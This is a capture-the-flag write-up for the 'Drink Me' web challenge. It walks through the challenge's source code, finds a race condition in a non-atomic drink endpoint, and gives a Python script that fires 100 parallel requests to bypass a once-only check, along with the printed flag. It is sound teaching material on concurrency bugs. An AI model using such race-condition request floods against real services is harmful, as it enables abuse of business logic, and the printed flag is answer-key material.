# Drink Me
* Category: Web
* 150 Points
* Solved by the JCTF Team

## Description

> Alice can't fit through the little door to get into the beautiful garden because she is too big.
> Suddenly she notices a glass bottle has magically appeared on the table.
> It has a pink label that says "DRINK ME" tied around it.
> Drinking from the bottle will hopefully shrink her.
> 
> So come on, hurry up, before it's too late.

## Solution

We visit the attached website and are greeted with a simple interactive game starring Alice from Wonderland. 
On the table next to here are a key and a potion labeled "Drink Me".
If we click the key, the game says "Too Big!". We can drink the potion and shrink a bit, but even after shrinking,
clicking the key still says "Too Big!" (and the potion is gone).

Let's check the sources:

```javascript
// version 2.0
$(document).ready(() => {
	getSize();
	
	$("#key").on("click", function() {
		useKey();
	});

	$("#reset").on("click", async () => {
		await fetch('/api/reset', {
			method: 'GET',
		}).then(() => location.reload())
	});
});

const getSize = async () => {
	await fetch('/api/getsize', {
		method: 'GET',
	})
	.then((response) => response.json()
		.then((resp) => {
			if (response.status == 200) {
				$('#alice').css('transform', 'scale(' + `${1/(Math.sqrt(resp.size))}` + ')');
				if (!resp.shrinked) { 
					const potionDiv = document.createElement("div");
					potionDiv.setAttribute("id", "potion");
					potionDiv.setAttribute("class", "potion");
					const potionImg = document.createElement("img");
					potionImg.setAttribute("src","../static/images/potion.png")					
					potionDiv.appendChild(potionImg);

					document.getElementById("table-wrapper").appendChild(potionDiv); 
					$("#potion").on("click", function() {
						drink();
					});
				}
				return;
			}
		}))
	.catch((error) => {
		console.log(error);
	});
}

const drink = async () => {
	await fetch('/api/drink', {
		method: 'POST',
		headers: {
			'Content-Type': 'application/json',
		},
		body: JSON.stringify({ shrink: '2x'}),
	})
	.then((resp) => {
			if (resp.status == 200) {
				getSize();
				$('#potion').fadeOut(100);
			}
			resp.text().then(txt => { document.getElementById("notes").innerHTML = txt; });
		})
	.catch((error) => {
		console.log(error);
	});
}

const useKey = async () => {
	await fetch('/api/usekey', {
		method: 'POST',
		header: {
			'Content-Type': 'application/json',
		},
		body: JSON.stringify({ key: 'open door'})
	})
	.then((resp) => {
			if (resp.status == 200) {
				$('#key').hide();
				$('#alice').hide();
				$('#wrapper').css('background-image', 'url("/static/images/background-open.png")');
			}
			resp.text().then(txt => { document.getElementById("notes").innerHTML = txt; });
		})
	.catch((error) => {
		console.log(error);
	})
}

// Follow me for more ;)
// https://github.com/AbsalomNargilotLTD

```

We can see that the actions that we performed are forwarded to remote APIs. We also get a tempting suggestion to follow a GitHub link for more info.

In the GitHub repo, we can find the server side code. We have the API implementation:

```javascript
const fs             = require('fs');
const express        = require('express');
const router         = express.Router();
const AuthMiddleware = require('../middleware/AuthMiddleware');

let db;

router.get('/', (req, res) => {
	return res.render('index.html');
});

const checkAlice = async (req, alice) => {
	if (alice === undefined) {
		await db.welcomeAlice(req.data.alice);
		alice = { alice: req.data.alice, size: 1, shrinked: 0 };
	}
	return alice;
}

router.post('/api/useKey', AuthMiddleware, async (req, res) => {
	let aliceData = await db.getAliceData(req.data.alice);
	aliceData = await checkAlice(req, aliceData);
	if (aliceData.size < 16) return res.status(403).send("Too big!");
	let flag = fs.readFileSync('flag').toString();
	res.status(200).send(`You may enter! Your size is ${aliceData.size}. Flag: ${flag}`);
});

router.post('/api/drink', AuthMiddleware, async (req, res) => {
	let aliceData = await db.getAliceData(req.data.alice);
	aliceData = await checkAlice(req, aliceData);
	if (aliceData.shrinked) { 
		return res.status(401).send("Can't drink again!");
	}
	try {
		await db.makeSmall(aliceData.alice);
		await db.setShrinked(aliceData.alice);
		aliceData = await db.getAliceData(req.data.alice);
		res.status(200).send("Alice shrinked!");
	} catch (e) {
		res.status(500).send("Failed to shrink!");
	}
});

router.get('/api/getsize', AuthMiddleware, async (req, res) => {
	let aliceData = await db.getAliceData(req.data.alice);
	aliceData = await checkAlice(req, aliceData);
	return res.status(200).send({ "size":aliceData.size, "shrinked":aliceData.shrinked});
});

router.get('/api/reset', async (req, res) => {
	res.clearCookie('session');
	res.status(200).send("Session was reset");
});

module.exports = database => {
	db = database;
	return router;
};
```

And some backend Database logic:

```javascript
const sqlite = require('sqlite-async');

class Database {
	constructor(db_file) {
		this.db_file = db_file;
		this.db = undefined;
	}
	
	async connect() {
		this.db = await sqlite.open(this.db_file);
	}

	async migrate() {
		return this.db.exec(`
            DROP TABLE IF EXISTS wonderland;
            CREATE TABLE IF NOT EXISTS wonderland (
                id         INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
                alice      VARCHAR(255) NOT NULL UNIQUE,
                size       INTEGER NOT NULL,
                shrinked   BOOLEAN NOT NULL
            );
        `);
	}

	async welcomeAlice(alice) {
		return new Promise(async (resolve, reject) => {
			try {
				let stmt = await this.db.prepare('INSERT INTO wonderland (alice, size, shrinked) VALUES ( ?, 1, 0)');
				resolve((await stmt.run(alice)));
			} catch(e) {
				reject(e);
			}
		});
	}

	async getAliceData(alice) {
		return new Promise(async (resolve, reject) => {
			try {
				let stmt = await this.db.prepare('SELECT * FROM wonderland WHERE alice = ?');
				resolve(await stmt.get(alice));
			} catch(e) {
				reject(e);
			}
		});
	}

	async setShrinked(alice) {
		return new Promise(async (resolve, reject) => {
			try {
				let stmt = await this.db.prepare('UPDATE wonderland SET shrinked = 1 WHERE alice = ?');
				resolve(await stmt.get(alice));
			} catch(e) {
				reject(e);
			}
		});
	}

	async makeSmall(alice) {
		return new Promise(async (resolve, reject) => {
			try {
				let stmt = await this.db.prepare('UPDATE wonderland SET size = size * 2 WHERE alice = ?');
				resolve(await stmt.get(alice));
			} catch(e) {
				reject(e);
			}
		});
	}
}

module.exports = Database;
```

So now we understand why the potion disappeared after drinking it:

```javascript
router.post('/api/drink', AuthMiddleware, async (req, res) => {
	let aliceData = await db.getAliceData(req.data.alice);
	aliceData = await checkAlice(req, aliceData);
	if (aliceData.shrinked) { 
		return res.status(401).send("Can't drink again!");
	}
	try {
		await db.makeSmall(aliceData.alice);
		await db.setShrinked(aliceData.alice);
		aliceData = await db.getAliceData(req.data.alice);
		res.status(200).send("Alice shrinked!");
	} catch (e) {
		res.status(500).send("Failed to shrink!");
	}
});
```

We can only drink the potion once. Once we drink it, the server sets `shrinked` to `true` and this blocks the logic from running on a second call:

```python
>>> import requests
>>> URL = "https://intent-drink-me.chals.io"
>>> r = requests.get(f"{URL}/api/getsize")
>>> r.text
>>> {'size': 1, 'shrinked': 0}
>>> cookies = r.cookies
>>> r = requests.post(f"{URL}/api/drink", cookies=cookies)
>>> r.text
'Alice shrinked!'
>>> r = requests.post(f"{URL}/api/drink", cookies=cookies)
>>> r.text
"Can't drink again!"
```

On the other hand, we must have a size of at least 16 in order to get the flag:

```javascript
router.post('/api/useKey', AuthMiddleware, async (req, res) => {
	let aliceData = await db.getAliceData(req.data.alice);
	aliceData = await checkAlice(req, aliceData);
	if (aliceData.size < 16) return res.status(403).send("Too big!");
	let flag = fs.readFileSync('flag').toString();
	res.status(200).send(`You may enter! Your size is ${aliceData.size}. Flag: ${flag}`);
});
```

The only way to get that small is to drink the potion multiple times, since every time we drink it our size gets multiplied by 2:

```javascript
async makeSmall(alice) {
		return new Promise(async (resolve, reject) => {
			try {
				let stmt = await this.db.prepare('UPDATE wonderland SET size = size * 2 WHERE alice = ?');
				resolve(await stmt.get(alice));
			} catch(e) {
				reject(e);
			}
		});
	}
```

What can we do? Well, a closer inspection of the implementation reveals a concurrency bug: The different database statements are not protected by an atomic transaction.
In other words, if enough calls to `makeSmall` get through before the first call to `setShrinked` happens, Alice will be able to get much small than the API wants to allow.

To achieve this, we use the `grequests` library to send multiple async requests to `/api/drink`, hoping that enough execute the size statement before the first one executes the shrinking statement. 


Here's the script:

```python
import grequests
import requests

URL = "https://intent-drink-me.chals.io"

r = requests.get(f"{URL}/api/getsize")
print(f"Alice's size: {r.json()['size']}")
cookies = r.cookies

times = 100
print(f"Drinking {times} times in parallel")
grequests.map([grequests.post(f"{URL}/api/drink", cookies=cookies) for _ in range(times)])

r = requests.get(f"{URL}/api/getsize", cookies=cookies)
print(f"Alice's size: {r.json()['size']}")

r = requests.post(f"{URL}/api/usekey", cookies=cookies)
print(r.text)
```

Execute it a few times to get the flag:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/Drink_Me]
└─$ python3 solve.py
Alice's size: 1
Drinking 100 times in parallel
Alice's size: 32
You may enter! Your size is 32. Flag: INTENT{wh47_a_cur10u5_f331ln9!}
```